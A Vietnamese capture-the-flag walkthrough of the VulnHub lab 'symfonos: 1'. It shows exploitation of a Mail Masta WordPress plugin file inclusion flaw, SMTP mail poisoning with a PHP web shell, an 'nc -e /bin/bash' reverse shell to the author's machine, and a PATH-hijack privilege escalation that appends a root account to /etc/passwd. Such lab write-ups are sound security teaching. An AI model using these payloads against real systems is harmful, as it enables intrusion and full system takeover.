## Mở đầu
- Lại là mình đây, vào mấy hôm rảnh rỗi lại mò vào vulhub.com để kiếm mấy bài lab để học hỏi, kiếm được bài **Difficulty: Beginner** nên build lên làm luôn xem nó có **Beginner** không :v: 
- Đây là một bài lab khá mới của tác giả **Zayotic** trong series **symfonos**. 
- Link bài lab nếu ai muốn khám phá: [symfonos: 1](https://www.vulnhub.com/entry/symfonos-1,322/)
## Tấn công
- Việc đầu tiên vẫn như thường ngày, build bài lab lên rồi quét địa chỉ ip của nó. Ở đây mình sử dụng `arp-scan` để quét cho nhanh.
    ```bash
    root@kali: arp-scan -l
    Interface: eth0, datalink type: EN10MB (Ethernet)
    Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
    192.168.19.34	00:0c:29:a0:2f:e9	VMware, Inc.
    ```
  ![](https://images.viblo.asia/bdc15fcd-b466-4e01-af27-1ad77d0fdce3.png)
- Web gì thế này, có mỗi cái ảnh là sao, tôi là ai, đây là đâu :scream::scream::scream::scream:
- Thử scan tất cả cổng trên này xem sao
    ```bash
    root@kali:~/Desktop# nmap -p- -A 192.168.19.34
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-10 14:56 +07
    Nmap scan report for symfonos.local (192.168.19.34)
    Host is up (0.00077s latency).
    Not shown: 65530 closed ports
    PORT    STATE SERVICE     VERSION
    22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
    |   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
    |_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
    25/tcp  open  smtp        Postfix smtpd
    |_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
    | ssl-cert: Subject: commonName=symfonos
    | Subject Alternative Name: DNS:symfonos
    | Not valid before: 2019-06-29T00:29:42
    |_Not valid after:  2029-06-26T00:29:42
    |_ssl-date: TLS randomness does not represent time
    80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
    |_http-server-header: Apache/2.4.25 (Debian)
    |_http-title: Site doesn't have a title (text/html).
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
    MAC Address: 00:0C:29:A0:2F:E9 (VMware)
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    TRACEROUTE

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 16.08 seconds
    ```
- Con máy này đang sử dụng dịch vụ mail smtp, có samba kìa, thử vào xem có gì k
  ![](https://images.viblo.asia/17b6e45f-e1b6-4eb0-bccb-dac0a69084fe.png)
- Có thư mục anonymous, vào mở thì thấy có một tin nhắn của thần Zeus =))
    ```
    Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

    Next person I find using one of these passwords will be fired!

    -Zeus
    ```
- Thử mấy cái `epidioko`, `qwerty` với `baseball` xem thần Zeus có block thật hay không :v: 
- Thử được thư mục helios có mật khẩu là `qwerty` thật :joy:
- Có 2 mẩu tin ở đây
- file `research.txt`:
    ```
    Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
    ```
- file `todo.txt`: 
    ```
    1. Binge watch Dexter
    2. Dance
    3. Work on /h3l105
    ```
- Humm, thử vào http://192.168.19.34/h3l105 xem sao. (À quên, add `192.168.19.34 symfonos.local` vào /etc/hosts đã)
- 1 trang Wordpress 

    ![](https://images.viblo.asia/9d3b1b6d-4165-4217-a326-ac3a43d25efb.png)
- Sử dụng `wpscan` thì thấy có lỗi như sau:
    ```bash
    root@kali:~# wpscan --url http://symfonos.local/h3l105/ --plugins-detection aggressive
    [+] mail-masta
     | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
     | Latest Version: 1.0 (up to date)
     | Last Updated: 2014-09-19T07:52:00.000Z
     | Readme: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
     | [!] Directory listing is enabled
     |
     | Detected By: Known Locations (Aggressive Detection)
     |
     | [!] 2 vulnerabilities identified:
     |
     | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)
     |     References:
     |      - https://wpvulndb.com/vulnerabilities/8609
     |      - https://www.exploit-db.com/exploits/40290/
     |      - https://cxsecurity.com/issue/WLB-2016080220
     |
     | [!] Title: Mail Masta 1.0 - Multiple SQL Injection
     |     References:
     |      - https://wpvulndb.com/vulnerabilities/8740
     |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095
     |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096
     |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097
     |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098
     |      - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin
     |
     | Version: 1.0 (100% confidence)
     | Detected By: Readme - Stable Tag (Aggressive Detection)
     |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
     | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
     |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
    ```
- Đọc một hồi về plugin `mail-masta` thì ở đây có dính Local File Inclusion (LFI)

    http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
    ![](https://images.viblo.asia/b5102935-8350-4f5a-8d00-3a48e558d46a.png)
    
- Ở file `/etc/passwd` ta xác định được có những user sau
    ```
    root
    helios
    mysql
    zeus
    wordpress
    ```
- Check lại bằng `smtp-user-enum` thì có đúng 3 users này có mail.
    ```bash
    root@kali:~# smtp-user-enum -M VRFY -U users.txt -t 192.168.19.34
    Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

     ----------------------------------------------------------
    |                   Scan Information                       |
     ----------------------------------------------------------

    Mode ..................... VRFY
    Worker Processes ......... 3
    Usernames file ........... users.txt
    Target count ............. 1
    Username count ........... 3
    Target TCP port .......... 25
    Query timeout ............ 3 secs
    Target domain ............ 

    ######## Scan started at Wed Jul 10 16:07:52 2019 #########
    192.168.19.34: root exists
    192.168.19.34: helios exists
    192.168.19.34: mysql exists
    ######## Scan completed at Wed Jul 10 16:07:53 2019 #########
    3 results.
    ```
- Chắc hẳn là phải có thư mục chứa mail, mình có thể đọc được mail người khác gửi đến `helios` 
    ![](https://images.viblo.asia/cf92086e-ad3f-4eec-a029-0661de4f6456.png)
- Thử gửi thư với payload cho `helios` xem sao
    ```bash
    root@kali:~# telnet 192.168.19.34 25
    Trying 192.168.19.34...
    Connected to 192.168.19.34.
    Escape character is '^]'.
    220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
    HELO localhost
    250 symfonos.localdomain
    MAIL FROM: tuan@symfonos.localdomain
    250 2.1.0 Ok
    RCPT TO: helios
    250 2.1.5 Ok
    DATA
    354 End data with <CR><LF>.<CR><LF>
    <?php system($_GET['c']); ?>
    ```
- Giờ ta sử dụng đường dẫn sau để kiểm tra xem sao:

    `view-source:http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id`
    ![](https://images.viblo.asia/9f83bba3-89d2-4752-ae4a-78c701946e24.png)
- Ok thành công rồi, chúng ta đã có 1 chú shell =))
- Tiếp theo thì ta remote đến nó thôi
- Đầu tiên thì mở `nc -lvp 4444` bên máy mình đã
- Sử dụng http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc%20-e%20/bin/bash%20-nv%20192.168.19.100%204444 để remote ngược về.
    ![](https://images.viblo.asia/01bfd890-cbe7-42ac-9bb5-b8b42b1446eb.png)
- Ngon, chúng ta đã có máy victim rồi :v:
    ```bash
    helios@symfonos:/home$ find / -perm -u=s 2>/dev/null
    find / -perm -u=s 2>/dev/null
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /usr/bin/passwd
    /usr/bin/gpasswd
    /usr/bin/newgrp
    /usr/bin/chsh
    /usr/bin/chfn
    /opt/statuscheck
    /bin/mount
    /bin/umount
    /bin/su
    /bin/ping
    helios@symfonos:/home$ 
    ```
    
- Có vẻ như `/opt/statuscheck` có thể khai thác được, thử run nó lên xem có gì k
    ```bash
    helios@symfonos:/opt$ ./statuscheck
    ./statuscheck
    HTTP/1.1 200 OK
    Date: Thu, 11 Jul 2019 01:49:50 GMT
    Server: Apache/2.4.25 (Debian)
    Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
    ETag: "148-58c6b9bb3bc5b"
    Accept-Ranges: bytes
    Content-Length: 328
    Vary: Accept-Encoding
    Content-Type: text/html
    ```
- Humm, nó chỉ kiểm tra cái trang web có Ok hay k, thử chạy `strings /opt/statuscheck` thì ra 1 đoạn này 
    ```bash
    curl -I H
    http://lH
    ocalhostH
    ```
    Dịch ra sẽ là:
    ```bash
    curl -I http://localhost
    ```
- Chúng ta cần khám phá được lệnh thực thi này
- Có vài phương thức, nhưng ở trong trường hợp này, dựa trên đầu ra `curl ...` nó đang thực thi với **đường dẫn tương đối** của nó, có nghĩa là, với đường dẫn có trong biến môi trường **$PATH**
    ```bash
    PATH ABSOLUTE: /usr/bin/curl
    PATH RELATIVELY: curl
    ```
- *Việc của chúng ta bây giờ là phải thay đổi biến $PATH của `helios` và chuyển hướng của chương trình `statuscheck` sang một thứ mà ta có thể kiểm soát được. Thay vì chạy trong `/usr/bin/curl`, ta sẽ điều hướng về để nó thực thi trong `/tmp/curl` chẳng hạn.*
- Giờ chúng ta vào thư mục `/tmp` rồi tạo 1 file `curl`, trong file đó có thứ mình muốn để nó chạy lên với quyền `root`, vì khi chạy `/opt/statuscheck`, nó sẽ kích hoạt quyền `root` lên. Và với cái `curl` giả kia, bạn có thể chạy quyền `root` với nội dung là bên trong cái file `curl` vừa tạo.
- Ở đây mình sẽ chọn cách thêm luôn 1 tài khoản `root` vào hệ thống.
- Cấu trúc của file `/etc/passwd`:
```username:password_crypt:user_id:group_id:name:home_directory:shell```
- Vậy giờ mình sẽ tạo 1 file như này :
    `minhtuan:x:0:0:root:/root:/usr/bin/bash` với `x` là mật khẩu được `crypt`.
    
    Mình sẽ sử dụng `perl` để `crypt` password.
    ```bash
   root@kali:~# perl -e 'print crypt("minhtuanact", "ahihi")'
    ahd.h7gFshGUw
    ```
- Vậy `ahd.h7gFshGUw` là `password crypt`, hoàn thiện đoạn thêm user kia sẽ là:
    ```
    minhtuan:ahd.h7gFshGUw:0:0:root:/root:/usr/bin/bash
    ```
- Giờ sẽ ghi vào file `/tmp/curl` với nội dung sẽ là 
    ```bash
    echo minhtuan:ahd.h7gFshGUw:0:0:root:/root:/bin/bash >> /etc/passwd
    ```

    Lệnh này nó sẽ thêm cái tài khoản của mình mới tạo kia vào `/etc/passwd`. Giờ sẽ phải đánh lừa `statuscheck` để nó chạy cái thằng `curl` giả kia lên rồi đăng nhập với tài khoản vừa tạo là xong :v:
- Xúc thôi :v:
    ```bash
    helios@symfonos:/tmp$ export PATH=/tmp
    export PATH=/tmp
    helios@symfonos:/tmp$ /opt/statuscheck
    /opt/statuscheck
    sh: 1: curl: Permission denied
    helios@symfonos:/tmp$ 
    ```
- Ơ `Permission denied`, à chết quên chưa cấp quyền cho file `curl` :joy:
    ```bash
    helios@symfonos:/tmp$ export PATH=$PATH_BACKUP
    export PATH=$PATH_BACKUP
    helios@symfonos:/tmp$ chmod +x curl
    chmod +x curl
    helios@symfonos:/tmp$ export PATH=/tmp
    export PATH=/tmp
    helios@symfonos:/tmp$ /opt/statuscheck
    /opt/statuscheck
    helios@symfonos:/tmp$ 
    ```
- Ok rồi, thử switch sang tài khoản vừa được tạo xem (trước tiên phải chạy `export PATH=$PATH_BACKUP` trước nhé, không là k có lệnh thực thi đâu)
    ```bash
    helios@symfonos:/tmp$ su minhtuan
    su minhtuan
    Password: minhtuanact
    root@symfonos:/tmp# id
    id
    uid=0(root) gid=0(root) groups=0(root)
    ```
- Vậy là ta đã có quyền root rồi. Đọc cờ cuối thôi
 ![](https://images.viblo.asia/ce773acd-b4d0-49d4-9124-ed97373682af.png)
 
## Tổng kết
- Bài này ở mức độ **Beginner** nhưng mình chẳng thấy nó **Beginner** tý nào lắm :joy::joy:
- Mong các bạn có thể học hỏi được gì thông qua bài này. Nếu các bạn cảm thấy hay thì cho mình 1 upvote nhé :D